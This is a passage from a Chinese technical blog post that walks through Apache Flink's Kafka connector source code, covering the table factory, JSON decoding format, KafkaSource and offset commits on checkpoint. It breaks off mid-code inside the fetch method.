<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485952%26idx%3D1%26sn%3Dffe1fca4cb75b2f99ace92593554837c%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485952&amp;idx=1&amp;sn=ffe1fca4cb75b2f99ace92593554837c&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习中独立成分分析ICA和主成分分析PCA有什么区别？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485960%26idx%3D1%26sn%3D05cf98957ea11dcd6ae165588b4c91c7%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485960&amp;idx=1&amp;sn=05cf98957ea11dcd6ae165588b4c91c7&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一文搞懂t-SNE和UMAP降维方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485972%26idx%3D1%26sn%3De106fcda9b02b7e8a6fb31495bb28dae%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485972&amp;idx=1&amp;sn=e106fcda9b02b7e8a6fb31495bb28dae&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">万字长文！搞懂机器学习中的概率图模型</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485986%26idx%3D1%26sn%3D9057c13995012cc7220eae20f6cfb4c2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485986&amp;idx=1&amp;sn=9057c13995012cc7220eae20f6cfb4c2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">万字长文！搞懂机器学习中半监督学习的经典方法！</a></p>
<p>作者：aicoting</p>
<p>分享是一种信仰，连接让成长更有温度。</p>
<p>我们下次不见不散！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flink源码阅读：Kafka Connector]]></title>    <link>https://juejin.cn/post/7597125475602317339</link>    <guid>https://juejin.cn/post/7597125475602317339</guid>    <pubDate>2026-01-20T14:05:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597125475602317339" data-draft-id="7597125475602300955" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flink源码阅读：Kafka Connector"/> <meta itemprop="keywords" content="Flink,大数据"/> <meta itemprop="datePublished" content="2026-01-20T14:05:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="面向Google编程"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flink源码阅读：Kafka Connector
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    面向Google编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:05:03.000Z" title="Tue Jan 20 2026 14:05:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文我们来梳理 Kafka Connector 相关的源码。</p>
<h3 data-id="heading-0">自定义 Source 和 Sink</h3>
<p>在介绍 Kafka Connector 之前，我们先来看一下在 Flink 中是如何支持自定义 Source 和 Sink 的。我们来看一张 Flink 官方文档提供的图。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57a5bc84c82248efa87969d645ce9eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=SzbKOFFgntjWtzjgc91KnxTtjkc%3D" alt="table-connector" loading="lazy"/></p>
<p>这张图展示了 Connector 的基本体系结构，三层架构也非常清晰。</p>
<h4 data-id="heading-1">Metadata</h4>
<p>首先是最上层的 MetaData，CREATE TABLE 会更新 Catalog，然后被转换为 TableAPI 的 CatalogTable，CatalogTable 实例用于表示动态表（Source 或 Sink 表）的元信息。</p>
<h4 data-id="heading-2">Planning</h4>
<p>在解析和优化程序时，会将 CatalogTable 转换为 DynamicTableSource 和 DynamicTableSink，分别用于查询和插入数据，这两个实例的创建都需要对应的工厂类，工厂类的完整路径需要放到这个配置文件中。</p>
<pre><code class="hljs language-bash" lang="bash">META-INF/services/org.apache.flink.table.factories.Factory
</code></pre>
<p>如果有需要的话，我们还可以在解析过程中配置编码和解码方法。</p>
<p>在 Source 端，通过三个接口支持不同的查询能力。</p>
<ul>
<li>
<p>ScanTableSource：用于消费 changelog 流，扫描的数据支持 insert、updata、delete 三种类型。ScanTableSource 还支持很多其他的功能， 都是通过接口提供的。具体可以看参考这个连接</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#source-abilities</span>
</code></pre>
</li>
<li>
<p>LookupTableSource：LookupTableSource 不会全量读取表的数据，它在需要时会发送请求，懒加载数据。目前只支持 insert-only 变更模式。</p>
</li>
<li>
<p>VectorSearchTableSource：使用一个输入向量来搜索数据，并返回最相似的 Top-K 行数据。</p>
</li>
</ul>
<p>在 Sink 端，通过 DynamicTableSink 来实现具体的写入逻辑，这里也提供了一些用于扩展能力的接口。具体参考</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#sink-abilities</span>
</code></pre>
<h4 data-id="heading-3">Runtime</h4>
<p>逻辑解析完成后，会到 Runtime 层。这里就是定义几个 Provider，在 Provider 中实现和连接器具体的交互逻辑。</p>
<h4 data-id="heading-4">小结</h4>
<p>当我们需要创建一个自定义的 Source 和 Sink 时，就可以通过以下步骤实现。</p>
<ol>
<li>
<p>定义 Flink SQL 的 DDL，需要定义相应的 Options。</p>
</li>
<li>
<p>实现 DynamicTableSourceFactory 和 DynamicTableSinkFactory，并把实现类的具体路径写到配置文件中。</p>
</li>
<li>
<p>实现 DynamicTableSource 和 DynamicTableSink，这里需要处理 SQL 层的元数据。</p>
</li>
<li>
<p>提供 Provider，将逻辑层与底层 DataStream 关联起来。</p>
</li>
<li>
<p>编写底层算子，实现 Source 和 Sink 接口。</p>
</li>
</ol>
<h3 data-id="heading-5">Kafka Connector 的实现</h3>
<p>带着这些知识，我们一起来看一下 Kafka Connector 相关的源码。</p>
<p>Kafka Connector 代码目前已经是一个独立的项目了。项目地址是</p>
<pre><code class="hljs language-bash" lang="bash">https://github.com/apache/flink-connector-kafka
</code></pre>
<h4 data-id="heading-6">Factory</h4>
<p>我们首先找到定义的工厂类</p>
<pre><code class="hljs language-java" lang="java">org.apache.flink.streaming.connectors.kafka.table.KafkaDynamicTableFactory
org.apache.flink.streaming.connectors.kafka.table.UpsertKafkaDynamicTableFactory
</code></pre>
<p>以 KafkaDynamicTableFactory 为例，它同时实现了 DynamicTableSourceFactory 和 DynamicTableSinkFactory 两个接口。</p>
<p>KafkaDynamicTableFactory 包含以下几个方法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44ee5eb786cb48809ce55e6043c3b56e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=qlEjjkldPHyzq1cTHUvag7yrLg0%3D" alt="KafkaDynamicTableFactory" loading="lazy"/></p>
<ul>
<li>
<p>factoryIdentifier：返回一个唯一标识符，对应 Flink SQL 中 connector='xxx' 这个配置。</p>
</li>
<li>
<p>requiredOptions：必填配置集合。</p>
</li>
<li>
<p>optionalOptions：选填配置集合。</p>
</li>
<li>
<p>forwardOptions：直接传递到 Runtime 层的配置集合。</p>
</li>
<li>
<p>createDynamicTableSource：创建 DynamicTableSource。</p>
</li>
<li>
<p>createDynamicTableSink：创建 DynamicTableSink。</p>
</li>
</ul>
<h4 data-id="heading-7">Source 端</h4>
<p>工厂类的 createDynamicTableSource 方法创建了 DynamicTableSource，我们来看一下创建的逻辑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSource <span class="hljs-title function_">createDynamicTableSource</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> FactoryUtil.createTableFactoryHelper(<span class="hljs-built_in">this</span>, context);

    <span class="hljs-keyword">final</span> Optional&lt;DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt;&gt; keyDecodingFormat =
            getKeyDecodingFormat(helper);

    <span class="hljs-keyword">final</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; valueDecodingFormat =
            getValueDecodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    validateTableSourceOptions(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueDecodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">StartupOptions</span> <span class="hljs-variable">startupOptions</span> <span class="hljs-operator">=</span> getStartupOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">BoundedOptions</span> <span class="hljs-variable">boundedOptions</span> <span class="hljs-operator">=</span> getBoundedOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> getKafkaProperties(context.getCatalogTable().getOptions());

    <span class="hljs-comment">// add topic-partition discovery</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">partitionDiscoveryInterval</span> <span class="hljs-operator">=</span>
            tableOptions.get(SCAN_TOPIC_PARTITION_DISCOVERY);
    properties.setProperty(
            KafkaSourceOptions.PARTITION_DISCOVERY_INTERVAL_MS.key(),
            Long.toString(partitionDiscoveryInterval.toMillis()));

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SCAN_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSource(
            physicalDataType,
            keyDecodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueDecodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            properties,
            startupOptions.startupMode,
            startupOptions.specificOffsets,
            startupOptions.startupTimestampMillis,
            boundedOptions.boundedMode,
            boundedOptions.specificOffsets,
            boundedOptions.boundedTimestampMillis,
            context.getObjectIdentifier().asSummaryString(),
            parallelism);
}
</code></pre>
<p>在这个方法中，首先要获取到 key 和 value 的解码格式。接着是各种参数校验和获取必要的属性。最后创建 KafkaDynamicSource 实例。</p>
<p>获取解码格式需要用到 DeserializationFormatFactory 工厂，DeserializationFormatFactory 有多个实现类，对应了多种格式的反序列化方法。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ba6cb71d8984c6195c812c249511d1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=LgsUYXYpM0bSTFcTWOqm%2FRjz9sA%3D" alt="DeserializationFormatFactory" loading="lazy"/></p>
<p>我们来看比较常见的 Json 格式的工厂 JsonFormatFactory。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; <span class="hljs-title function_">createDecodingFormat</span><span class="hljs-params">(
        DynamicTableFactory.Context context, ReadableConfig formatOptions)</span> {
    FactoryUtil.validateFactoryOptions(<span class="hljs-built_in">this</span>, formatOptions);
    JsonFormatOptionsUtil.validateDecodingFormatOptions(formatOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">failOnMissingField</span> <span class="hljs-operator">=</span> formatOptions.get(FAIL_ON_MISSING_FIELD);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ignoreParseErrors</span> <span class="hljs-operator">=</span> formatOptions.get(IGNORE_PARSE_ERRORS);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonParserEnabled</span> <span class="hljs-operator">=</span> formatOptions.get(DECODE_JSON_PARSER_ENABLED);
    <span class="hljs-type">TimestampFormat</span> <span class="hljs-variable">timestampOption</span> <span class="hljs-operator">=</span> JsonFormatOptionsUtil.getTimestampFormat(formatOptions);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProjectableDecodingFormat</span>&lt;DeserializationSchema&lt;RowData&gt;&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DeserializationSchema&lt;RowData&gt; <span class="hljs-title function_">createRuntimeDecoder</span><span class="hljs-params">(
                DynamicTableSource.Context context,
                DataType physicalDataType,
                <span class="hljs-type">int</span>[][] projections)</span> {
            <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">producedDataType</span> <span class="hljs-operator">=</span>
                    Projection.of(projections).project(physicalDataType);
            <span class="hljs-keyword">final</span> <span class="hljs-type">RowType</span> <span class="hljs-variable">rowType</span> <span class="hljs-operator">=</span> (RowType) producedDataType.getLogicalType();
            <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; rowDataTypeInfo =
                    context.createTypeInformation(producedDataType);
            <span class="hljs-keyword">if</span> (jsonParserEnabled) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonParserRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption,
                        toProjectedNames(
                                (RowType) physicalDataType.getLogicalType(), projections));
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption);
            }
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> ChangelogMode <span class="hljs-title function_">getChangelogMode</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> ChangelogMode.insertOnly();
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsNestedProjection</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> jsonParserEnabled;
        }
    };
}
</code></pre>
<p>在创建解码格式时，最重要的是创建运行时的解码器，也就是 DeserializationSchema，在 JsonFormatFactory 中，有 JsonParserRowDataDeserializationSchema 和 JsonRowDataDeserializationSchema 两种实现，分别是用于将 JsonParser 和 JsonNode 转换成为 RowData，具体的逻辑都在 createNotNullConverter 方法中。</p>
<p>了解完解码格式后，我们把视角拉回到 KafkaDynamicSource，它实现了三个接口 ScanTableSource、SupportsReadingMetadata、SupportsWatermarkPushDown。分别用于消费数据，读取元数据和生成水印。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> ScanRuntimeProvider <span class="hljs-title function_">getScanRuntimeProvider</span><span class="hljs-params">(ScanContext context)</span> {
    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; keyDeserialization =
            createDeserialization(context, keyDecodingFormat, keyProjection, keyPrefix);

    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; valueDeserialization =
            createDeserialization(context, valueDecodingFormat, valueProjection, <span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; producedTypeInfo =
            context.createTypeInformation(producedDataType);

    <span class="hljs-keyword">final</span> KafkaSource&lt;RowData&gt; kafkaSource =
            createKafkaSource(keyDeserialization, valueDeserialization, producedTypeInfo);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataStreamScanProvider</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DataStream&lt;RowData&gt; <span class="hljs-title function_">produceDataStream</span><span class="hljs-params">(
                ProviderContext providerContext, StreamExecutionEnvironment execEnv)</span> {
            <span class="hljs-keyword">if</span> (watermarkStrategy == <span class="hljs-literal">null</span>) {
                watermarkStrategy = WatermarkStrategy.noWatermarks();
            }
            DataStreamSource&lt;RowData&gt; sourceStream =
                    execEnv.fromSource(
                            kafkaSource, watermarkStrategy, <span class="hljs-string">"KafkaSource-"</span> + tableIdentifier);
            providerContext.generateUid(KAFKA_TRANSFORMATION).ifPresent(sourceStream::uid);
            <span class="hljs-keyword">return</span> sourceStream;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBounded</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> kafkaSource.getBoundedness() == Boundedness.BOUNDED;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Optional&lt;Integer&gt; <span class="hljs-title function_">getParallelism</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> Optional.ofNullable(parallelism);
        }
    };
}
</code></pre>
<p>在 ScanRuntimeProvider 的逻辑中，先获取到反序列化器，也就是刚刚我们提到的 DeserializationSchema。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fda648b380364e92baebee5c64ba586d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=rrIxhHnz6i3ip8ywXqcedhIZNis%3D" alt="KafkaSource" loading="lazy"/></p>
<p>然后开始创建 KafkaSource 实例，它是 Source 的实现类，也就是执行引擎层了，这个过程会依次创建图中这些类。</p>
<p>KafkaSource 中主要是创建 KafkaSourceReader 和 KafkaSourceEnumerator，KafkaSourceEnumerator 是负责和分片相关的逻辑，包括分片分配和分片发现等。</p>
<p>KafkaSourceReader 中主要是和 State 相关的逻辑，包括触发快照和完成 Checkpoint 通知的方法。当做 Snapshot 时，会记录活跃 split 的 offset，同时将 split 作为状态提交。当 Checkpoint 完成时，会调用 <code>KafkaSourceFetcherManager.commitOffsets</code> 提交 offset。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaPartitionSplit&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> {
    List&lt;KafkaPartitionSplit&gt; splits = <span class="hljs-built_in">super</span>.snapshotState(checkpointId);
    <span class="hljs-keyword">if</span> (!commitOffsetsOnCheckpoint) {
        <span class="hljs-keyword">return</span> splits;
    }

    <span class="hljs-keyword">if</span> (splits.isEmpty() &amp;&amp; offsetsOfFinishedSplits.isEmpty()) {
        offsetsToCommit.put(checkpointId, Collections.emptyMap());
    } <span class="hljs-keyword">else</span> {
        Map&lt;TopicPartition, OffsetAndMetadata&gt; offsetsMap =
                offsetsToCommit.computeIfAbsent(checkpointId, id -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());
        <span class="hljs-comment">// Put the offsets of the active splits.</span>
        <span class="hljs-keyword">for</span> (KafkaPartitionSplit split : splits) {
            <span class="hljs-comment">// If the checkpoint is triggered before the partition starting offsets</span>
            <span class="hljs-comment">// is retrieved, do not commit the offsets for those partitions.</span>
            <span class="hljs-keyword">if</span> (split.getStartingOffset() &gt;= <span class="hljs-number">0</span>) {
                offsetsMap.put(
                        split.getTopicPartition(),
                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">OffsetAndMetadata</span>(split.getStartingOffset()));
            }
        }
        <span class="hljs-comment">// Put offsets of all the finished splits.</span>
        offsetsMap.putAll(offsetsOfFinishedSplits);
    }
    <span class="hljs-keyword">return</span> splits;
}


<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">notifyCheckpointComplete</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> <span class="hljs-keyword">throws</span> Exception {
    LOG.debug(<span class="hljs-string">"Committing offsets for checkpoint {}"</span>, checkpointId);
    ...

    ((KafkaSourceFetcherManager) splitFetcherManager)
            .commitOffsets(
                    committedPartitions,
                    (ignored, e) -&gt; {...});
}
</code></pre>
<p>KafkaSourceFetcherManager 负责管理 fetcher 线程，提交 Offset。</p>
<p>KafkaPartitionSplitReader 的 fetch 方法用来消费 Kafka 的数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> RecordsWithSplitIds&lt;ConsumerRecord&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt;&gt; fetch() <span class="hljs-keyword">throws</span> IOException {
    ConsumerRecords&lt;<span class="hljs-type">byte</span>[], <span class="hljs-type">byte</span>[]&gt; consumerRecords;
    <span class="hljs-keyword">try</span> {
        consumerRecords = consumer.poll(Duration.ofMillis(POLL_TIMEOUT));
    } <span class="hljs-keyword">catch</span> (WakeupException | IllegalStateException e) {
        <span class="hljs-comment">// IllegalStateException will be thrown if the consumer is not assigned any partitions.</span>
        <span class="hljs-comment">// This happens if all assigned partitions are invalid or empty (starting offset &gt;=</span>
        <span class="hljs-comment">// stopping offset). We just mark empty partitions as finished and return an empty</span>
        <span class="hljs-comment">// record container, and this consumer will be closed by SplitFetcherManager.</span>
        <span class="hljs-type">KafkaPartitionSplitRecords</span> <span class="hljs-variable">recordsBySplits</span> <span class="hljs-operator">=</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">KafkaPartitionSplitRecords</span>(
                        ConsumerRecords.empty(), kafkaSourceReaderMetrics);
